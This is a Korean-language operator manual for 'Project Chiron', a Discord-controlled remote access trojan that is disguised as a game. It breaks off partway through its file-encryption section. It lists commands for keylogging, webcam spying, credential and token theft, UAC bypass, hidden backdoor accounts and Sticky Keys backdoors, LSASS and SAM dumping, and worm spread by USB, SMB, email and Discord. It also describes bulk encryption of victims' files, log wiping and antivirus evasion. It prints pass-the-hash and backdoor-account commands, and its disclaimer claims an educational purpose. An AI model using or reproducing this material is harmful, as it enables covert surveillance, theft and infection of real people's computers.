# Project-Chiron

# 🚀 Project Chiron - 통합 사용자 매뉴얼

---

**버전: 2.5**
**최종 업데이트: 2025-10-21**

**경고: 이 프로그램은 교육 및 승인된 보안 연구 목적으로만 제작되었습니다. 불법적인 사용으로 인해 발생하는 모든 법적 책임은 사용자에게 있습니다.**

---

## 📖 목차

1.  [**소개**](#-1-소개)
    -   [Project Chiron이란?](#project-chiron이란)
    -   [주요 기능 요약](#주요-기능-요약)
    -   [프로젝트 아키텍처](#프로젝트-아키텍처)
2.  [**설치 및 배포**](#-2-설치-및-배포)
    -   [요구사항](#요구사항)
    -   [봇 설정](#봇-설정)
    -   [실행 파일 빌드](#실행-파일-빌드)
3.  [**기본 사용법**](#-3-기본-사용법)
    -   [Discord 봇 상호작용](#discord-봇-상호작용)
    -   [에이전트 타겟팅](#에이전트-타겟팅)
    -   [도움말 시스템](#도움말-시스템)
4.  [**전체 명령어 레퍼런스**](#-4-전체-명령어-레퍼런스)
5.  [**핵심 기능 명령어**](#-5-핵심-기능-명령어)
    -   [에이전트 관리](#에이전트-관리)
    -   [시스템 정보 수집](#시스템-정보-수집)
    -   [실시간 감시](#실시간-감시)
    -   [파일 시스템 제어](#파일-시스템-제어)
    -   [시스템 제어](#시스템-제어)
6.  [**고급 모듈 가이드**](#-6-고급-모듈-가이드)
    -   [인증정보 탈취](#인증정보-탈취)
    -   [권한 상승 (Privilege Escalation)](#권한-상승-privilege-escalation)
    -   [비밀번호 제어](#비밀번호-제어)
    -   [USB 전파 및 잠금 해제](#usb-전파-및-잠금-해제)
    -   [지속성 (Persistence)](#지속성-persistence)
    -   [전파 (Propagation)](#전파-propagation)
    -   [실시간 모니터링](#실시간-모니터링)
    -   [자동화 및 스케줄링](#자동화-및-스케줄링)
    -   [네트워크 분석](#네트워크-분석)
    -   [원격 셸](#원격-셸)
    -   [데이터 수집 및 검색](#데이터-수집-및-검색)
    -   [파일 암호화/복호화](#파일-암호화복호화)
7.  [**흔적 제거 및 자가 삭제**](#-7-흔적-제거-및-자가-삭제)
    -   [흔적 제거 명령어](#흔적-제거-명령어)
    -   [자가 삭제 명령어](#자가-삭제-명령어)
8.  [**안티바이러스(AV) 회피**](#-8-안티바이러스av-회피)
    -   [내장 회피 기법](#내장-회피-기법)
    -   [추가 회피 전략](#추가-회피-전략)
    -   [탐지 위험도 비교](#탐지-위험도-비교)
9.  [**운영 보안 (OPSEC)**](#-9-운영-보안-opsec)
10. [**문제 해결**](#-10-문제-해결)
11. [**실전 시나리오**](#-11-실전-시나리오)
    -   [시나리오 1: 초기 침투 및 정보 수집](#시나리오-1-초기-침투-및-정보-수집)
    -   [시나리오 2: 시스템 완전 장악](#시나리오-2-시스템-완전-장악)
    -   [시나리오 3: 데이터 유출 및 흔적 제거](#시나리오-3-데이터-유출-및-흔적-제거)
    -   [시나리오 4: USB를 통한 물리적 공격](#시나리오-4-usb를-통한-물리적-공격)
12. [**법적 면책조항**](#-12-법적-면책조항)

---

## 📜 1. 소개

### Project Chiron이란?
**Project Chiron**은 Discord를 C2(Command & Control) 서버로 사용하는 원격 관리 및 보안 연구 도구입니다. 파이썬으로 제작되었으며, 다양한 모듈을 통해 원격 시스템에 대한 강력한 제어, 정보 수집, 감시 기능을 제공합니다. 모든 기능은 사용자가 위장용으로 실행하는 공룡 게임의 백그라운드에서 은밀하게 작동합니다.

### 주요 기능 요약
- **다중 에이전트 관리**: 여러 대의 감염된 PC를 하나의 Discord 채널에서 동시에 제어합니다.
- **실시간 감시**: 스크린샷, 웹캠 캡처, 키로깅, 클립보드 모니터링 등을 지원합니다.
- **정보 탈취**: 브라우저(Chrome v20 포함), WiFi, Discord, Steam 등 다양한 플랫폼의 인증 정보를 추출합니다.
- **권한 상승**: UAC 바이패스를 통해 일반 사용자에서 관리자(Administrator) 및 시스템(SYSTEM) 권한을 획득합니다.
- **파일 시스템 제어**: 파일 트리 시각화, 상세 검색, AES-256 암호화/복호화, 업로드/다운로드를 지원합니다.
- **지속성 및 전파**: 레지스트리, 시작프로그램, 예약된 작업, WMI 등 다양한 방법으로 지속성을 유지하고 USB, 네트워크, 클라우드 등을 통해 스스로를 전파합니다.
- **완전한 제어**: 원격 셸, 비밀번호 강제 변경, 백도어 계정 생성, 시스템 종료/재시작 등을 수행합니다.
- **흔적 제거**: 모든 활동 로그와 시스템 변경 사항을 정리하고, 에이전트를 자가 삭제하여 흔적을 남기지 않습니다.

### 프로젝트 아키텍처

```
┌─────────────────────────────────────────────────────────┐
│                    Discord C2 Server                    │
│            (Operator's Discord Channel)                 │
└───────────────────────┬─────────────────────────────────┘
                        │ Commands & Control
                        ▼
┌─────────────────────────────────────────────────────────┐
│                    core.py (Main Agent)                 │
│  ┌─────────────────────────────────────────────────┐   │
│  │  🎮 Dino Game (Disguise Layer)                  │   │
│  └─────────────────────────────────────────────────┘   │
│                                                          │
│  ┌──────────────────── Modules ───────────────────┐    │
│  │                                                 │    │
│  │  📊 Information Gathering                       │    │
│  │    • sys_info.py - System information          │    │
│  │    • credentials.py - Password extraction      │    │
│  │    • token_stealer.py - Session tokens         │    │
│  │                                                 │    │
│  │  👁️ Surveillance                                │    │
│  │    • surveillance.py - Screenshots/Webcam      │    │
│  │    • clipboard_monitor.py - Clipboard          │    │
│  │    • realtime_monitor.py - File/Process        │    │
│  │                                                 │    │
│  │  🚀 Privilege & Control                         │    │
│  │    • privilege_escalation.py - UAC Bypass      │    │
│  │    • password_stealer.py - Password control    │    │
│  │    • remote_shell.py - Remote shell            │    │
│  │                                                 │    │
│  │  📁 File Operations                             │    │
│  │    • file_operations.py - Tree/Search/Encrypt  │    │
│  │    • file_crypto.py - AES-256 encryption       │    │
│  │    • data_searcher.py - Pattern search         │    │
│  │                                                 │    │
│  │  🔒 Persistence & Propagation                   │    │
│  │    • persistence.py - Basic persistence        │    │
│  │    • enhanced_persistence.py - Advanced        │    │
│  │    • propagation.py - USB/Network spread       │    │
│  │    • advanced_propagation.py - Email/Cloud     │    │
│  │    • usb_propagation.py - USB infection        │    │
│  │                                                 │    │
│  │  🤖 Automation                                  │    │
│  │    • scheduler.py - Task scheduling            │    │
│  │    • smart_collector.py - Data collection      │    │
│  │                                                 │    │
│  │  🗑️ Cleanup                                     │    │
│  │    • self_destruct.py - Self-removal           │    │
│  │    • av_evasion.py - AV detection bypass       │    │
│  └─────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────┘
        │              │              │
        ▼              ▼              ▼
   Agent 1        Agent 2        Agent N
  (PC #1)        (PC #2)        (PC #N)
```

**총 모듈 수: 30개 이상**
**총 명령어 수: 100개 이상**
**지원 OS: Windows 10/11 (주 타겟), 부분적 Linux/macOS 지원**

---

## 🛠️ 2. 설치 및 배포

### 요구사항
- **Python 3.8+**
- **Windows 10/11** (대부분의 기능이 Windows에 최적화됨)
- `requirements.txt`에 명시된 모든 파이썬 라이브러리

### 봇 설정
1.  **Discord 봇 생성**: [Discord 개발자 포털](https://discord.com/developers/applications)에서 새 애플리케이션과 봇을 생성합니다.
2.  **권한 설정**: 봇에게 `메시지 읽기/쓰기`, `파일 첨부` 권한을 부여합니다.
3.  **인증 활성화**: `Privileged Gateway Intents` 섹션에서 `MESSAGE CONTENT INTENT`를 활성화합니다.
4.  **정보 복사**: 봇 토큰, 명령을 내릴 채널 ID, 명령을 내릴 운영자의 Discord 사용자 ID를 복사합니다.
5.  **`core.py` 수정**: `core.py` 파일 상단의 설정 변수에 위에서 복사한 정보를 입력합니다.
    ```python
    BOT_TOKEN = "여러분의_봇_토큰"
    CHANNEL_ID = 여러분의_채널_ID
    OPERATOR_ID = 여러분의_사용자_ID
    ```

### 실행 파일 빌드
프로젝트 폴더에서 다음 명령어를 실행하여 모든 파이썬 코드를 하나의 `.exe` 파일로 빌드합니다.
```bash
python build.py
```
- **결과물**: `dist/` 폴더 내에 `SystemUpdater.exe` (또는 설정된 이름) 파일이 생성됩니다.
- **배포**: 생성된 실행 파일을 타겟 시스템으로 옮겨 실행하면 에이전트가 활성화됩니다.

---

## 🕹️ 3. 기본 사용법

### Discord 봇 상호작용
- 모든 명령어는 `!` 접두사로 시작합니다. (예: `!agents`)
- 봇은 지정된 채널에서 지정된 운영자의 명령어에만 반응합니다.
- 명령어 결과가 길 경우, 텍스트 파일(`*.txt`)로 자동 변환되어 전송됩니다.

### 에이전트 타겟팅
- **전체 에이전트**: `!command` (예: `!screenshot`)
- **특정 에이전트**: `!command @agent_id` (예: `!sysinfo @user@PC-01[a1b2c3d4]`)
- **명시적 전체**: `!command @all` (예: `!cleanup @all`)

### 도움말 시스템
언제든지 `!help`를 입력하여 명령어 목록을 확인할 수 있습니다.
- `!help`: 기본 도움말 메뉴
- `!help <카테고리>`: 특정 카테고리의 명령어 목록 (예: `!help surveillance`)
- `!help all`: 모든 명령어 목록

---

## 📋 4. 전체 명령어 레퍼런스

### 빠른 검색 테이블

#### 에이전트 & 정보 수집 (14개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!agents` | 에이전트 목록 | User | 🟢 |
| `!ping` | 응답 확인 | User | 🟢 |
| `!id` | 에이전트 ID | User | 🟢 |
| `!status` | 상태 확인 | User | 🟢 |
| `!dashboard` | 대시보드 | User | 🟢 |
| `!capabilities` | 기능 목록 | User | 🟢 |
| `!stats` | 통계 | User | 🟢 |
| `!sysinfo` | 시스템 정보 | User | 🟢 |
| `!wifipass` | WiFi 비밀번호 | User | 🟡 |
| `!wifiinfo` | 현재 WiFi 정보 | User | 🟢 |
| `!netstat` | 네트워크 연결 | User | 🟢 |
| `!tasklist` | 프로세스 목록 | User | 🟢 |
| `!connections` | 활성 연결 | User | 🟢 |
| `!network_stats` | 네트워크 통계 | User | 🟢 |

#### 감시 & 모니터링 (16개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!screenshot` | 스크린샷 | User | 🟡 |
| `!webcam` | 웹캠 캡처 | User | 🟡 |
| `!start_keylogger` | 키로거 시작 | User | 🔴 |
| `!stop_keylogger` | 키로거 중지 | User | 🟢 |
| `!dump_keys` | 키로그 덤프 | User | 🔴 |
| `!monitor_usb` | USB 모니터링 | User | 🟢 |
| `!monitor_process` | 프로세스 모니터링 | User | 🟡 |
| `!monitor_file` | 파일 모니터링 | User | 🟡 |
| `!monitor_network` | 네트워크 모니터링 | User | 🟡 |
| `!monitor_stop` | 모니터링 중지 | User | 🟢 |
| `!monitor_status` | 모니터링 상태 | User | 🟢 |
| `!clipboard_start` | 클립보드 모니터링 | User | 🔴 |
| `!clipboard_stop` | 클립보드 중지 | User | 🟢 |
| `!clipboard_dump` | 클립보드 히스토리 | User | 🔴 |
| `!clipboard_search` | 클립보드 검색 | User | 🟡 |

#### 인증정보 탈취 (9개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!browser_creds` | 브라우저 비밀번호 | User | 🟡 |
| `!chrome_advanced` | Chrome v20 (SYSTEM) | Admin | 🔴 |
| `!chrome_inject` | Chrome v20 (Injection) | Admin | 🔴 |
| `!chrome_devtools` | Chrome v20 (DevTools) | User | 🟡 |
| `!chrome_memory` | Chrome v20 (Memory) | Admin | 🔴 |
| `!steal_tokens` | 모든 토큰 | User | 🔴 |
| `!steal_discord` | Discord 토큰 | User | 🔴 |
| `!steal_telegram` | Telegram 세션 | User | 🔴 |
| `!steal_steam` | Steam 세션 | User | 🔴 |

#### 파일 시스템 (20개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!ls` / `!dir` | 디렉토리 목록 | User | 🟢 |
| `!files` | 파일 브라우저 | User | 🟢 |
| `!go` | 폴더 진입 | User | 🟢 |
| `!out` | 상위 폴더 | User | 🟢 |
| `!tree` | 트리 시각화 | User | 🟢 |
| `!cd` | 디렉토리 변경 | User | 🟢 |
| `!pwd` | 현재 경로 | User | 🟢 |
| `!search` | 파일 검색 | User | 🟡 |
| `!interesting` | 중요 파일 검색 | User | 🟡 |
| `!download` | 파일 다운로드 | User | 🟡 |
| `!upload` | 파일 업로드 | User | 🟡 |
| `!encrypt` | 파일 암호화 | User | 🔴 |
| `!decrypt` | 파일 복호화 | User | 🟡 |
| `!encrypt_dir` | 폴더 암호화 | User | 🔴 |
| `!search_emails` | 이메일 검색 | User | 🟡 |
| `!search_cards` | 카드번호 검색 | User | 🔴 |
| `!search_api_keys` | API 키 검색 | User | 🔴 |
| `!search_all` | 전체 데이터 검색 | User | 🔴 |
| `!smart_collect` | 스마트 수집 | User | 🔴 |
| `!find_crypto` | 암호화폐 지갑 | User | 🔴 |

#### 권한 & 제어 (15개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!elevate` | 자동 권한 상승 | User | 🔴 |
| `!check_privs` | 권한 확인 | User | 🟢 |
| `!get_system` | SYSTEM 권한 | Admin | 🔴 |
| `!bypass_uac` | UAC 바이패스 | User | 🔴 |
| `!change_password` | 비밀번호 변경 | Admin | 🔴 |
| `!change_all_passwords` | 전체 비밀번호 변경 | Admin | 🔴 |
| `!create_backdoor` | 백도어 계정 | Admin | 🔴 |
| `!disable_user` | 계정 비활성화 | Admin | 🔴 |
| `!enable_user` | 계정 활성화 | Admin | 🟡 |
| `!steal_password` | 비밀번호 추출 | Admin | 🔴 |
| `!unlock_computer` | 잠금 해제 백도어 | Admin | 🔴 |
| `!shell` | 셸 명령 실행 | User | 🟡 |
| `!shell_start` | 원격 셸 시작 | User | 🔴 |
| `!shell_cmd` | 셸 명령어 | User | 🟡 |
| `!shell_stop` | 원격 셸 중지 | User | 🟢 |

#### 지속성 & 전파 (25개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!persist_all` | 모든 지속성 | Admin | 🔴 |
| `!persist_registry` | 레지스트리 | User | 🟡 |
| `!persist_startup` | 시작프로그램 | User | 🟡 |
| `!persist_task` | 예약 작업 | Admin | 🔴 |
| `!persist_wmi` | WMI 지속성 | Admin | 🔴 |
| `!persist_status` | 지속성 상태 | User | 🟢 |
| `!persist_remove` | 지속성 제거 | User | 🟢 |
| `!enable_propagation` | 전파 활성화 | User | 🔴 |
| `!disable_propagation` | 전파 비활성화 | User | 🟢 |
| `!propagation_status` | 전파 상태 | User | 🟢 |
| `!propagate_network` | 네트워크 전파 | User | 🔴 |
| `!propagate_email` | 이메일 전파 | User | 🔴 |
| `!propagate_discord` | Discord 전파 | User | 🔴 |
| `!propagate_cloud` | 클라우드 전파 | User | 🟡 |
| `!propagate_wifi` | WiFi 수집 | User | 🟡 |
| `!propagate_all` | 전체 전파 | User | 🔴 |
| `!propagate_auto_start` | 자동 전파 시작 | User | 🔴 |
| `!propagate_auto_stop` | 자동 전파 중지 | User | 🟢 |
| `!usb_infect` | USB 감염 | User | 🔴 |
| `!usb_monitor` | USB 모니터링 | User | 🟡 |
| `!usb_stop` | USB 중지 | User | 🟢 |
| `!usb_status` | USB 상태 | User | 🟢 |

#### 자동화 (6개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!schedule` | 작업 예약 | User | 🟡 |
| `!schedule_list` | 예약 목록 | User | 🟢 |
| `!schedule_cancel` | 예약 취소 | User | 🟢 |
| `!schedule_clear` | 전체 취소 | User | 🟢 |
| `!automode` | 자동 모드 | User | 🔴 |
| `!stealthmode` | 스텔스 모드 | User | 🟡 |

#### 시스템 제어 (5개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!shutdown` | 시스템 종료 | User | 🔴 |
| `!restart` | 시스템 재시작 | User | 🔴 |
| `!lock` | 워크스테이션 잠금 | User | 🟡 |
| `!kill` | 프로세스 종료 | User | 🟡 |

#### 정리 & 삭제 (6개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!cleanup` | 전체 정리 | Admin | 🔴 |
| `!clear_logs` | 로그 삭제 | Admin | 🔴 |
| `!clear_temp` | 임시파일 삭제 | User | 🟡 |
| `!clear_browser` | 브라우저 정리 | User | 🟡 |
| `!remove_persistence` | 지속성 제거 | User | 🟡 |
| `!selfdestruct` | 자가 삭제 | User | 🔴 |

#### 도움말 (3개)
| 명령어 | 기능 | 권한 | 위험도 |
|--------|------|------|--------|
| `!help` | 도움말 메뉴 | User | 🟢 |
| `!quickstart` | 빠른 시작 | User | 🟢 |

**전체: 약 120개 명령어**

### 위험도 범례
- 🟢 **낮음**: 거의 탐지되지 않음, 일반적인 시스템 조회
- 🟡 **중간**: 일부 보안 솔루션이 탐지 가능, 주의 필요
- 🔴 **높음**: 대부분의 보안 솔루션이 탐지, 매우 위험

---

## ⚙️ 5. 핵심 기능 명령어

### 에이전트 관리
| 명령어 | 설명 |
| :--- | :--- |
| `!agents` | 활성화된 모든 에이전트 목록과 상태를 확인합니다. |
| `!ping` | 에이전트의 응답 여부와 지연 시간을 확인합니다. |
| `!id` | 현재 에이전트의 고유 ID와 구성 정보를 확인합니다. |
| `!status` | 에이전트의 상세 상태(OS, CPU, 메모리 등)를 확인합니다. |
| `!dashboard` | 시스템 상태와 활성 기능을 시각적인 대시보드로 보여줍니다. |

### 시스템 정보 수집
| 명령어 | 설명 |
| :--- | :--- |
| `!sysinfo` | OS, 하드웨어, 네트워크 등 종합적인 시스템 정보를 수집합니다. |
| `!wifipass` | 시스템에 저장된 모든 WiFi 프로필과 비밀번호를 추출합니다. |
| `!netstat` | 현재 활성화된 네트워크 연결 목록을 보여줍니다. |
| `!tasklist` / `!ps` | 실행 중인 모든 프로세스 목록을 보여줍니다. |

### 실시간 감시
| 명령어 | 설명 |
| :--- | :--- |
| `!screenshot` | 현재 화면을 캡처하여 이미지 파일로 전송합니다. |
| `!webcam` | 웹캠이 있을 경우, 사진을 촬영하여 전송합니다. |
| `!start_keylogger` | 키보드 입력을 기록하기 시작합니다. |
| `!stop_keylogger` | 키로거를 중지합니다. |
| `!dump_keys` | 현재까지 기록된 키로그를 전송합니다. |

### 파일 시스템 제어
| 명령어 | 설명 |
| :--- | :--- |
| `!ls` / `!dir` / `!files` | 지정된 경로의 파일 및 폴더 목록을 보여줍니다. |
| `!tree [경로]` | 지정된 경로의 디렉토리 구조를 트리 형태로 시각화합니다. |
| `!cd <경로>` | 현재 작업 디렉토리를 변경합니다. |
| `!pwd` | 현재 작업 디렉토리 경로를 표시합니다. |
| `!download <파일>` | 지정된 파일을 Discord 채널로 다운로드합니다. |
| `!upload` | Discord에 첨부한 파일을 타겟 시스템에 업로드합니다. |

### 시스템 제어
| 명령어 | 설명 |
| :--- | :--- |
| `!shell <명령어>` | 타겟 시스템에서 직접 셸 명령어를 실행합니다. (예: `!shell ipconfig`) |
| `!shutdown` | 시스템을 즉시 종료합니다. |
| `!restart` | 시스템을 재시작합니다. |
| `!lock` | 워크스테이션을 잠급니다. (Windows 전용) |
| `!kill <프로세스>` | 지정된 프로세스를 강제 종료합니다. |

---

## 🚀 6. 고급 모듈 가이드

### 인증정보 탈취
- **표준 브라우저 (`!browser_creds`)**: Edge, Brave, Opera 등 Chromium 기반 브라우저의 저장된 비밀번호를 추출합니다. **(권장, 탐지 위험 낮음)**
- **Chrome v20+ 고급 탈취**: Chrome 127 버전 이상에서 사용하는 App-Bound Encryption을 우회하여 비밀번호를 추출합니다. **(탐지 위험 높음)**
    - `!chrome_advanced`: SYSTEM 권한 획득을 통한 우회 시도.
    - `!chrome_inject`: Chrome 프로세스에 DLL을 주입하여 우회 시도.
    - `!chrome_devtools`: 개발자 도구 프로토콜을 이용한 우회 시도.
    - `!chrome_memory`: 프로세스 메모리를 스캔하여 비밀번호 탐색.
    > 📖 상세 정보: `CHROME_V20_BYPASS_GUIDE.md`

### 권한 상승 (Privilege Escalation)
- `!elevate`: 알려진 UAC 바이패스 기법(Fodhelper, Eventvwr 등)을 순차적으로 시도하여 사용자 프롬프트 없이 관리자 권한을 획득합니다.
- `!get_system`: 관리자 권한 상태에서 시스템(SYSTEM) 최고 권한을 획득합니다.
- `!check_privs`: 현재 프로세스의 권한 수준을 확인합니다.
> 📖 상세 정보: `PRIVILEGE_ESCALATION.md`

### 비밀번호 제어
- `!change_password [사용자] [비번]`: 특정 사용자의 비밀번호를 강제로 변경합니다.
- `!change_all_passwords [비번]`: 시스템의 모든 사용자 비밀번호를 변경합니다.
- `!create_backdoor [사용자] [비번]`: 로그인 화면에 보이지 않는 숨겨진 관리자 계정을 생성합니다.
- `!disable_user <사용자>`: 특정 사용자의 계정을 비활성화하여 로그인을 막습니다.
- `!enable_user <사용자>`: 비활성화된 사용자 계정을 다시 활성화합니다.
> 📖 상세 정보: `PASSWORD_CONTROL.md`

### USB 전파 및 잠금 해제

#### USB 자동 감염
- **`!usb_infect`**: 현재 연결된 모든 USB 드라이브를 감염시킵니다.
  - LNK 바로가기를 폴더처럼 위장하여 생성
  - autorun.inf 생성 (일부 시스템에서 작동)
  - 페이로드를 숨김 속성으로 복사
  - 다른 PC에 USB를 연결하면 자동 실행

- **`!usb_monitor`**: USB 드라이브 연결을 감시하여 자동으로 감염시킵니다.
  - 백그라운드에서 USB 연결 이벤트 모니터링
  - 새 USB 감지 시 즉시 감염
  - 5초마다 새 드라이브 확인

- **`!usb_stop`**: USB 모니터링을 중지합니다.
- **`!usb_status`**: 현재 USB 감염 상태와 감염된 드라이브 목록을 확인합니다.

#### Windows 로그인 비밀번호 추출
- **`!steal_password`**: 4가지 방법으로 Windows 로그인 비밀번호를 추출합니다.
  - **NTLM 해시 덤프**: SAM 레지스트리에서 해시 추출
  - **Credential Manager**: Windows 저장 자격 증명
  - **LSA Secrets**: 서비스 계정 비밀번호
  - **LSASS 메모리 덤프**: 평문 비밀번호 가능성

- **`!ntlm_hash`**: NTLM 해시만 추출합니다.
- **`!dump_credentials`**: Credential Manager의 모든 자격 증명을 덤프합니다.

**추출된 해시 사용법:**
```bash
# Hashcat으로 크랙
hashcat -m 1000 ntlm_hash.txt rockyou.txt

# John the Ripper로 크랙
john --format=NT ntlm_hash.txt

# Pass-the-Hash 공격
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 //192.168.1.100 cmd
```

#### 잠긴 컴퓨터 우회
- **`!unlock_computer`**: 잠긴 Windows 컴퓨터를 우회하는 4가지 백도어를 설치합니다.
  - **Sticky Keys 백도어**: 잠금 화면에서 SHIFT 5번 → CMD (SYSTEM 권한)
  - **Utilman 백도어**: 접근성 아이콘 클릭 → CMD (SYSTEM 권한)
  - **자동 로그인**: 재부팅 시 자동 로그인 설정
  - **비밀번호 제거**: 사용자 비밀번호 완전 제거

- **`!sticky_backdoor`**: Sticky Keys 백도어만 설치합니다.
- **`!restore_backdoors`**: 설치된 모든 백도어를 제거하고 원래 상태로 복원합니다.

**Sticky Keys 백도어 사용법:**
```
1. 잠금 화면에서 SHIFT 키를 5번 누름
2. CMD가 SYSTEM 권한으로 실행됨
3. 비밀번호 변경:
   net user <사용자이름> <새비밀번호>
4. 또는 새 관리자 생성:
   net user hacker Password123! /add
   net localgroup administrators hacker /add
```

> 📖 상세 정보: `ADVANCED_FEATURES.md`

### 지속성 (Persistence)
- `!persist_all`: 사용 가능한 모든 지속성 유지 방법을 활성화합니다. (UAC 프롬프트 발생 가능)
- `!persist_registry`: 레지스트리 `Run` 키에 등록합니다.
- `!persist_startup`: 시작프로그램 폴더에 바로가기를 생성합니다.
- `!persist_task`: 예약된 작업을 생성하여 주기적으로 실행되게 합니다.
- `!persist_wmi`: WMI 이벤트를 통해 은밀하게 실행되게 합니다. (관리자 권한 필요)
- `!persist_status`: 현재 활성화된 지속성 상태를 확인합니다.
- `!persist_remove`: 설치된 모든 지속성 메커니즘을 제거합니다.
> 📖 상세 정보: `enhanced_persistence.py` 모듈 참조

### 전파 (Propagation)
**⚠️ 기본적으로 모든 전파 기능은 비활성화되어 있습니다.**
- `!enable_propagation`: USB 및 기본 네트워크 전파 기능을 활성화합니다.
- `!propagation_status`: 현재 전파 기능의 활성화 상태를 확인합니다.
- **고급 전파**:
    - `!propagate_network`: 로컬 네트워크(SMB)를 스캔하여 다른 PC를 감염시킵니다.
    - `!propagate_email`: Outlook 주소록을 읽어 악성 파일이 첨부된 이메일을 발송합니다.
    - `!propagate_discord`: Discord 토큰을 탈취하여 친구들에게 악성 파일이 담긴 DM을 보냅니다.
    - `!propagate_cloud`: OneDrive, Dropbox 등 동기화 폴더에 파일을 숨겨 연결된 모든 기기로 전파합니다.
    - `!propagate_all`: 사용 가능한 모든 전파 수단을 실행합니다.
> 📖 상세 정보: `ADVANCED_PROPAGATION.md`, `PROPAGATION_CONTROL.md`

### 실시간 모니터링
- `!monitor_usb`: USB 연결/해제를 실시간으로 감지합니다.
- `!monitor_process`: 특정 프로세스(안티바이러스, 분석 도구 등)의 실행을 감지합니다.
- `!monitor_file`: 특정 폴더의 파일 생성/삭제/수정을 감지합니다.
- `!clipboard_start`: 클립보드 내용을 실시간으로 감시하고 민감한 정보(비밀번호, 카드번호 등)를 탐지합니다.
- `!monitor_status`: 모든 모니터링 기능의 상태를 확인합니다.

### 자동화 및 스케줄링
- `!schedule <명령어> <초>`: 특정 명령어를 지정된 시간(초) 간격으로 반복 실행하도록 예약합니다.
- `!schedule_list`: 예약된 작업 목록을 확인합니다.
- `!schedule_cancel <ID>`: 특정 예약 작업을 취소합니다.
- `!automode`: 스크린샷, 키로그, 정보 수집 등 주요 감시 활동을 자동으로 주기적으로 실행하는 '자동 모드'를 활성화합니다.
- `!stealthmode`: '자동 모드'보다 실행 간격이 긴 '스텔스 모드'를 활성화하여 탐지 가능성을 줄입니다.

### 네트워크 분석
네트워크 연결 및 통계를 실시간으로 분석합니다.

- **`!connections`**: 현재 활성화된 모든 네트워크 연결을 표시합니다.
  - ESTABLISHED, LISTEN, CLOSE_WAIT 등 연결 상태
  - 로컬/원격 IP 주소 및 포트
  - 연결을 소유한 프로세스 ID
  
- **`!network_stats`**: 네트워크 인터페이스의 통계를 표시합니다.
  - 총 송신/수신 바이트 수
  - 패킷 수 및 에러율
  - 대역폭 사용량
  
- **`!network_interfaces`**: 모든 네트워크 인터페이스 정보를 표시합니다.
  - 인터페이스 이름 및 상태
  - IPv4/IPv6 주소
  - MAC 주소
  - 전송 속도

- **`!dns_log`**: DNS 쿼리 로그를 기록합니다. (실험적 기능)

### 원격 셸
원격 시스템에서 명령어를 실행하는 강력한 셸 기능을 제공합니다.

- **`!shell <명령어>`**: 단일 명령어를 즉시 실행합니다.
  ```
  예시:
  !shell whoami
  !shell ipconfig /all
  !shell dir C:\Users
  ```

- **`!shell_start`**: 지속적인 원격 셸 세션을 시작합니다.
  - 큐 기반 명령어 실행
  - 10초 타임아웃
  - 출력 자동 캡처
  
- **`!shell_cmd <명령어>`**: 활성 셸 세션에서 명령어를 실행합니다.
  
- **`!shell_stop`**: 원격 셸 세션을 종료합니다.
  
- **`!shell_status`**: 원격 셸의 활성화 상태를 확인합니다.

**주의사항:**
- 명령어는 백그라운드 스레드에서 실행됩니다.
- 대화형 명령어(예: `python`, `cmd`)는 제대로 작동하지 않을 수 있습니다.
- 긴 실행 시간이 필요한 작업은 타임아웃될 수 있습니다.

### 데이터 수집 및 검색
- **토큰 탈취**:
    - `!steal_tokens`: Discord, Telegram, Steam, Epic Games 등 다양한 애플리케이션의 세션/로그인 토큰을 탈취합니다.
    - `!steal_discord`: Discord 토큰만 추출 (구/신 형식 모두 지원)
    - `!steal_telegram`: Telegram 세션 파일 추출
    - `!steal_steam`: Steam 로그인 세션 추출
    
- **스마트 수집**:
    - `!smart_collect`: 시스템의 모든 주요 자산을 자동으로 수집합니다.
      - 암호화폐 지갑 (Bitcoin, Ethereum, Monero 등)
      - SSH 키 (id_rsa, id_ed25519, .pem, .ppk 등)
      - 비밀번호 파일 (password, api_key, token 등이 포함된 파일)
      - 브라우저 세션 (쿠키, Local Storage)
    - `!find_crypto`: 암호화폐 지갑만 검색
    - `!find_ssh`: SSH 키만 검색
    - `!find_passwords`: 비밀번호 파일만 검색
    - `!find_sessions`: 브라우저 세션만 검색
    
- **상세 데이터 검색**:
    - `!search_emails [경로]`: 파일 시스템에서 이메일 주소 패턴 검색
    - `!search_cards [경로]`: 신용카드 번호 패턴 검색 (Visa, MasterCard, Amex 등)
    - `!search_api_keys [경로]`: API 키 패턴 검색 (AWS, GitHub, Slack 등)
    - `!search_phones [경로]`: 전화번호 패턴 검색
    - `!search_regex <패턴> [경로]`: 커스텀 정규식 패턴으로 검색
    - `!search_all [경로]`: 모든 민감한 데이터를 종합적으로 검색
    - `!search_large <크기MB> [경로]`: 지정된 크기 이상의 파일 검색
    - `!search_ext <확장자> [경로]`: 특정 확장자의 파일만 검색

**검색 최적화:**
- 기본적으로 최대 20-100개 결과만 반환
- 1-5MB 이상의 큰 파일은 건너뜀
- Documents, Desktop, Downloads 폴더 우선 검색

### 파일 암호화/복호화
AES-256-GCM 암호화 알고리즘을 사용한 군사급 파일 암호화 기능입니다.

#### 암호화 명령어
- **`!encrypt <파일경로>`**: 자동 생성된 256-bit 키로 파일을 암호화합니다.
  ```
  예시: !encrypt C:\Users\victim\Documents\important.docx
  결과: important.docx.encrypted + 자동생성 키 제공
  ```
  
- **`!encrypt <파일경로> <비밀번호>`**: 지정된 비밀번호로 파일을 암호화합니다.
  ```
  예시: !encrypt C:\secret.txt MySecretKey123
  ```
  
- **`!encrypt_dir <디렉토리>`**: 디렉토리 내 모든 파일을 자동 키로 일괄 암호화합니다.
  ```
  예시: !encrypt_dir C:\Users\victim\Documents
  ```
  
- **`!encrypt_dir <디렉토리> <비밀번호>`**: 지정된 비밀번호로 디렉토리 암호화합니다.

#### 복호화 명령어
- **`!decrypt <암호화파일> <키/비밀번호>`**: 암호화된 파일을 복호화합니다.
  ```
